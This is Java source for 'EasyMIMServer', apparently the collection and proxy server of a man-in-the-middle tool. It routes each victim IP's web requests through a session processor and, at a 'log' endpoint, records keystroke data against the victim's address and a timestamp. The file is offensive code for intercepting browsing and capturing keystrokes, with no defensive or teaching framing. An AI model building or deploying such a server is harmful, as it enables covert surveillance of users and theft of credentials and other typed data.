package Server;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.eclipse.jetty.server.handler.ContextHandler;
import org.eclipse.jetty.servlet.ServletContextHandler;
import org.eclipse.jetty.servlet.ServletHolder;

import sun.org.mozilla.javascript.internal.json.JsonParser;

import Models.LogElement;

import com.google.gson.Gson;
import com.sun.xml.internal.bind.v2.schemagen.xmlschema.List;

public class EasyMIMServer {
	public static HashMap<String,WebsiteProcessor> sessions = new HashMap<String,WebsiteProcessor>();
	
	static class EasyMIMServlet extends HttpServlet
	{
		WebsiteProcessor wp;
	    public EasyMIMServlet(){}
	    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
	    {
	    	try{
		    	if(!sessions.containsKey(request.getRemoteAddr())){
		    		sessions.put(request.getRemoteAddr(),new WebsiteProcessor());
		    	}
		    	if(request.getRequestURI().contains("log")){
		    		Gson gson = new Gson();
		    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
		    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
		    		//log ket stroke data
		    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
		    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
		    		return;
		    	}
		    	//log website visit
		    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
		    	wp = sessions.get(request.getRemoteAddr());
				response.setStatus(HttpServletResponse.SC_OK);
				wp.processRequest(request, response);
	    	}catch(Exception e){
	    		
	    	}
	    	
	    }
	    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
	    {
	    	doGet(request,response);
	    }
	    public Map<String,String> convertToRightMap(Map<String,String[]> data){
	    	HashMap<String,String> out = new HashMap<String,String>();
	    	for(String key:data.keySet()){
	    		out.put(key, data.get(key)[0]);
	    	}
	    	return out;
	    }
	}
	public static void main(String[] args) throws Exception
	{
		
        Server server = new Server(8080);
        
        ServletContextHandler context = new ServletContextHandler();
        context.setContextPath("/");
        server.setHandler(context);
        context.addServlet(new ServletHolder(new EasyMIMServlet()),"/*");
        //context.addServlet(new ServletHolder(new HelloServlet("Buongiorno Mondo")),"/it/*");
        server.start();
        server.join();
	}
}
